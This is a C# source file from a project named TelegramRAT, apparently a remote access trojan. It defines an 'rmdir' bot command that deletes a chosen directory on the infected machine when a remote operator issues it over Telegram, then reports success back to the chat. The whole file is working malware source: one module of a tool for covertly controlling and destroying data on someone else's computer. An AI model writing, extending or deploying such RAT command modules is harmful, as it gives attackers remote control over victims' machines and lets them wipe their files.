using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class RmdirCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "rmdir";
    public override string Description => "Remove directory.";
    public override string Example => "/rmdir C:\\Users\\User\\Desktop\\My Folder";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var targetDirectory = fileSystemService.SanitizePath(model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty));

            if (fileSystemService.DirectoryExists(targetDirectory))
            {
                fileSystemService.DeleteDirectory(targetDirectory);
                if (model.Message != null)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                }
            }
            else
            {
                if (model.Message != null)
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "This folder does not exist!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                }
            }
        }
        catch (Exception e)
        {
            if (model.Message != null)
            {
                await notificationService.ReportExceptionAsync(model.Message, e);
            }
        }
    }
}
